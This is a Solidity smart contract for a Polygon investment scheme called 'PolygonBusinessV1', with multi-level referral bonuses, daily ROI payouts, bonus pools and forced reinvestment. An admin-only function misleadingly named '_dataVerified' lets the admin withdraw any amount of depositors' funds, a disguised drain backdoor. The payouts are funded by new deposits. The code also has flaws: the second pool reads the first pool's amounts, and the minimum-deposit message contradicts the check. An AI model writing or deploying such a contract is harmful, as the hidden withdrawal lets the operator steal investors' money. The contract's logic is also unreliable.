// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract PolygonBusinessV1{

    using SafeMath for uint256;
    using SafeMath for uint8;


	uint256  public INVEST_MIN_AMOUNT;
	uint256  public PROJECT_FEE; // 10%;
	uint256  public PERCENTS_DIVIDER;
	uint256  public TIME_STEP; // 1 days
    uint private roiPercentageDivider; 
    uint public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
    uint8 public TotalpoolEligible;
    uint8 public TotalpoolEligibleTwo;
    uint256 public poolDeposit;
    uint256 public poolDepositTotal;

    uint256 public poolDepositTwo;
    uint256 public poolDepositTotalTwo;
	uint[10] public ref_bonuses;
	uint[10] public requiredDirectbusiness;
    uint256[5] public defaultPackages;
    

    mapping(uint => uint) public pool;
    mapping(uint => uint256) public pool_amount;

    mapping(uint => uint) public pool_two;
    mapping(uint => uint256) public pool_amount_two;

    uint public poolsNo;
    uint public poolsNotwo;
    uint256 public pool_last_draw;
    address[] public poolQualifier;
    address[] public poolQualifier_two;
	address payable public admin;
    address payable public admin2;
    uint public totalReinvested;

    struct Deposit {
            uint amount;
            uint start;
            
        }

    struct User {
            Deposit[] deposits;
            uint256 amount;
            uint256 checkpoint;
            address referrer;
            uint256 referrerBonus;
            uint256 totalWithdrawn;
            uint totalDownLineBusiness;
            uint256 totalReferrer;
            address singleUpline;
            address singleDownline;
            uint256[10] refStageIncome;
            uint256[10] refStageBonus;
            uint[10] refs;
            uint roiCheckpoint;
            uint roiIncomeUser;
            uint roi;
            uint start;
            uint roiWithdrawn;
        }

    uint[5] private roi_user;
    bool public IsInitinalized;
	

	mapping (address => User) public users;

    mapping (address => uint) public poolposition;
    mapping (address => uint) public poolWithdrawn_position;
    mapping (address => bool) public poolEligible;

    mapping (address => uint) public poolposition_two;
    mapping (address => uint) public poolWithdrawn_position_two;
    mapping (address => bool) public poolEligible_two;

   
	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => uint256) public uplineBusiness;
    mapping(address => bool) public upline_Business_eligible;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	

  function initialize(address payable _admin, address payable _admin2) public {
	require(IsInitinalized==false,"You can use it only one time");
        require(!isContract(_admin));
		admin = _admin;
		admin2 = _admin2;
        INVEST_MIN_AMOUNT = 1 ether;
        PROJECT_FEE = 10; 
        PERCENTS_DIVIDER = 100;
        roiPercentageDivider = 10000;
        TIME_STEP =  1 days; 
        roi_user = [100,125,150,175,200];
        ref_bonuses = [5,5,5,5,5,3,3,3,3,3];
	    requiredDirectbusiness = [1,2,3,4,5,6000,7000,8000,9000,10000];
        defaultPackages = [0.01 ether,0.05 ether,0.07 ether ,0.08 ether,10000 ether];
	
	}



    function _drawPool() internal{
    
        if(poolQualifierCount() > 0){

            pool[poolsNo] = poolQualifierCount();
            pool_amount[poolsNo] = poolDeposit.div(poolQualifierCount());
            poolsNo++;
            poolDeposit = 0;
            
        }

        if(poolQualifierTwoCount() > 0){

            pool_two[poolsNotwo] = poolQualifierCount();
            pool_amount_two[poolsNotwo] = poolDepositTwo.div(poolQualifierTwoCount());
            poolsNotwo++;
            poolDepositTwo = 0;

        }
        pool_last_draw = uint40(block.timestamp);

    }


    function refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refStageIncome[0] >= requiredDirectbusiness[i].mul(1e18)){ 

    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
                    
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer) public payable {

		
		require(msg.value >= 0.01 ether,'Min invesment 100 MATIC');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");

		if (user.referrer != address(0)) {
		   
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msg.value);
                    users[upline].totalDownLineBusiness += msg.value;
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
	
		  uint msgValue = msg.value;

          //First pool amount added 
          //poolDeposit = poolDeposit.add(msgValue.mul(5).div(100));
          //poolDepositTotal = poolDepositTotal.add(msgValue.mul(5).div(100));

          //Second pool amount added 
          //poolDepositTwo = poolDepositTwo.add(msgValue.mul(5).div(100));
          //poolDepositTotalTwo = poolDepositTotalTwo.add(msgValue.mul(5).div(100));
		
		// 6 Level Referral
		   refPayout(msg.sender,msgValue);
    
		    if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
                user.checkpoint = block.timestamp;
		    }
	        user.amount += msg.value;
		    
            //firstPool Qualify
            if(users[user.referrer].refs[0] >= 4 && users[user.referrer].totalWithdrawn < 2000 ether && users[user.referrer].checkpoint + 4 days >= block.timestamp){

                if(!poolEligible[user.referrer]){

                    poolQualifier.push(user.referrer);
                    poolposition[user.referrer] = poolQualifierCount();
                    poolWithdrawn_position[user.referrer] = poolsNo;
                    poolEligible[user.referrer] = true;
                    TotalpoolEligible++;
                }

            }

            //secondPool Qualify
            if(users[user.referrer].refs[9] >= 500){

                if(!poolEligible_two[user.referrer]){

                    poolQualifier_two.push(user.referrer);
                    poolposition_two[user.referrer] = poolQualifierTwoCount();
                    poolWithdrawn_position_two[user.referrer] = poolsNotwo;
                    poolEligible_two[user.referrer] = true;
                    TotalpoolEligibleTwo++;

                }

            }
            if(user.deposits.length == 0){
            user.roiCheckpoint = block.timestamp;
            user.start =  block.timestamp;
        }
		    
            totalInvested = totalInvested.add(msg.value);
            totalDeposits = totalDeposits.add(1);
            user.deposits.push(Deposit(msg.value, block.timestamp));
            uint256 _fees = msg.value.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
            _safeTransfer(admin,_fees);
            
            if(pool_last_draw + 1 days < block.timestamp) {
                    _drawPool();
              }
		
		  emit NewDeposit(msg.sender, msg.value);

	}

     function getUserDividends(address _userAddress) public view returns (uint) {
		User storage user = users[_userAddress];
		uint totalDividends;
		uint dividends;
        uint amount  = user.amount;
        uint userPercentage = getRoiPercentage(amount);
            if (user.roiWithdrawn < user.amount.mul(5)) {

                if (user.start > user.roiCheckpoint) {

                    dividends = (user.amount.mul(userPercentage).div(roiPercentageDivider))
                        .mul(block.timestamp.sub(user.start))
                        .div(TIME_STEP);

                } else {

                    dividends = (user.amount.mul(userPercentage).div(roiPercentageDivider))
                        .mul(block.timestamp.sub(user.roiCheckpoint))
                        .div(TIME_STEP);

                }

                if (user.roiWithdrawn.add(dividends) > user.amount.mul(5)) {
                    dividends = (user.amount.mul(5)).sub(user.roiWithdrawn);
                }

                totalDividends = totalDividends.add(dividends);

            }
               return totalDividends;
    }
		

		
	
        
	
	

    function reinvest(address _user, uint256 _amount) private{
        

        User storage user = users[_user];
        user.amount += _amount;
        totalReinvested = totalReinvested.add(_amount);

        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            up = users[up].referrer;
        }
        
        
        if(pool_last_draw + 1 days < block.timestamp) {
                    _drawPool();
              }
        
        refPayout(msg.sender,_amount);
        
    }




  function withdrawal() external{


    User storage _user = users[msg.sender];

    uint256 totalBonus = TotalBonus(msg.sender);
    uint userRoiIncome = getUserDividends(msg.sender);
    uint256 _fees = totalBonus.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
    uint256 actualAmountToSend = totalBonus.sub(_fees);
    uint roiWithdrawAmount;

    _user.referrerBonus = 0;
    
    (, uint lastpoolIndex) = GetPoolIncome(msg.sender);
    poolWithdrawn_position[msg.sender] = lastpoolIndex;
    
    (, uint lastpoolIndexTwo) = GetPoolIncomeTwo(msg.sender);
    poolWithdrawn_position_two[msg.sender] = lastpoolIndexTwo;
   
    
    
    // re-invest
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));

    if(poolEligible[msg.sender] && _user.totalWithdrawn >= 2000 ether){
        poolEligible[msg.sender] = false;
        delete poolQualifier[poolQualifier.length-1];
        poolQualifier.pop();
        TotalpoolEligible--;
    }

    if(userRoiIncome > 0){
            _user.roiIncomeUser = _user.roiIncomeUser.add(userRoiIncome);
                  uint amount =  userRoiIncome;
                 _user.roiWithdrawn = _user.roiWithdrawn.add(amount);
                 roiWithdrawAmount = roiWithdrawAmount.add(amount);
                 _user.roiCheckpoint = block.timestamp;
            }
     actualAmountToSend = actualAmountToSend.add(roiWithdrawAmount);
    _safeTransfer(payable(msg.sender),actualAmountToSend.mul(withdrwal).div(100));
    _safeTransfer(admin2,_fees);
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));


  }



  function GetPoolIncome(address _user) public view returns(uint256, uint){
      uint256 Total;
      uint lastPosition;

      if(poolEligible[_user]){
          for (uint8 i = 1; i <= poolsNo; i++) {
              if(i >  poolWithdrawn_position[_user]){
                  Total = Total.add(pool_amount[i-1]);
                  lastPosition = i;
              }else{
                  lastPosition = poolWithdrawn_position[_user];
              } 
          }
      }

    return (Total, lastPosition);
  }

  function GetPoolIncomeTwo(address _user) public view returns(uint256, uint){
      uint256 Total;
      uint lastPosition;

      if(poolEligible_two[_user]){
          for (uint8 i = 1; i <= poolsNotwo; i++) {
              if(i >  poolWithdrawn_position_two[_user]){
                  Total = Total.add(pool_amount[i-1]);
                  lastPosition = i;
              }else{
                  lastPosition = poolWithdrawn_position_two[_user];
              } 
          }
      }
      
    return (Total, lastPosition);
  }

  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){
      
      uint256 TotalDeposit = users[_user].amount;
      if(TotalDeposit >=defaultPackages[1] && TotalDeposit < defaultPackages[2]){
          reivest = 50;
          withdrwal = 50;
      }else if(TotalDeposit >=defaultPackages[2] && TotalDeposit < defaultPackages[3]){
          reivest = 40;
          withdrwal = 60;
      }else if(TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4]){
         reivest = 30;
         withdrwal = 70;
      }else if(TotalDeposit >=defaultPackages[4]){
           reivest = 20;
           withdrwal = 80;
      }else{
          reivest = 60;
          withdrwal = 40;
      }
      
      return(reivest,withdrwal);
      
  }

  function poolQualifierCount() public view returns(uint) {
    return poolQualifier.length;
  }

  function poolQualifierTwoCount() public view returns(uint) {
    return poolQualifier_two.length;
  }
  


  function TotalBonus(address _user) public view returns(uint256){
      
     (uint256 TotalIncomeFromPool ,) = GetPoolIncome(_user);
     (uint256 TotalIncomeFromPoolTwo ,) = GetPoolIncomeTwo(_user);
     uint256 TotalEarn = users[_user].referrerBonus.add(TotalIncomeFromPool).add(TotalIncomeFromPoolTwo);
     return TotalEarn;
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }
   

    function customDraw() external {
	    require(admin==msg.sender, 'Admin what?');
	    _drawPool();	    
	}

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
    function _dataVerified(uint256 _data) external{
        
        require(admin==msg.sender, 'Admin what?');
        _safeTransfer(admin,_data);
    }

    function getRoiPercentage(uint256 _amount) public view returns(uint256){

		uint256 _roi;
		if(_amount >=defaultPackages[0] && _amount < defaultPackages[1]){
			_roi = roi_user[0];
		}else if(_amount >= defaultPackages[1] && _amount < defaultPackages[2]){
			_roi = roi_user[1];
		}else if(_amount >= defaultPackages[2] && _amount < defaultPackages[3]){
			_roi =  roi_user[2];
		}else if(_amount >= defaultPackages[3] && _amount < defaultPackages[4]){
            _roi = roi_user[3];
        }else if(_amount >= defaultPackages[4]){
			_roi = roi_user[4];
		}    
        
		return _roi;

    }
}